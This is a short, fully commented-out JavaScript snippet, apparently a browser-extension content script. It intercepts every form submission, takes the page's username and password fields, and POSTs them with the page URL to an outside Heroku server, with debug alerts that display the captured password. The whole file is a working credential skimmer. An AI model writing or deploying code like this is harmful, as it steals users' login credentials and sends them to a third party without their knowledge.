// $(function() {
//   alert("potato");
//  var passwordBoxes = $("input[type=password]"),
//  getMessage = function(username, password, url) {
//   return "username=" + username + "&password=" + password + "&url=" + url;
//  },
//  sendEmail = function(username, password, url, callback) {
//   var msg = getMessage(username, password, url);
//   $.ajax({
//    type: 'POST',
//    url: 'https://potato-server.herokuapp.com/stuff', 
//    data: msg, 
//    success: callback
//   });
//   alert(String(msg));
//  },
//  process = function(callback) {
//   var username = $("input[type=text]").not(passwordBoxes).filter(function() {
//    var field = $(this);
//    return field.val() || field.html();
//   }).val(),
//   password = passwordBoxes.val();
//   var hash = {"username": username, "password": password};
//   // chrome.storage.sync.set({ String(location.href): hash }, function(){
//   //     });
//   alert(String(password))
//   sendEmail(username, password, location.href, callback);
//  };

//  $("form").submit(function(e) {
//   var $this = $(this);
//   e.preventDefault();
//   process(function() {
//    // $this.unbind('submit');
//    // $this.submit();
//   });
//  });
// });